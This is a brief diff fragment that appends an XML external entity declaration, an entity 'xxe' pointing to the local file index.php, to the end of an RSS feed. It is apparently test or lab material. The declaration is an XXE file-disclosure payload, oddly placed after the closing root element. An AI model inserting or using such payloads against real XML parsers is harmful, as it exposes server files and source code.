@@ -19,3 +19,8 @@
 </item>
 </channel>
 </rss>
+
+<!DOCTYPE rss [
+<!ELEMENT title ANY>
+<!ENTITY xxe SYSTEM "index.php" >
+]>
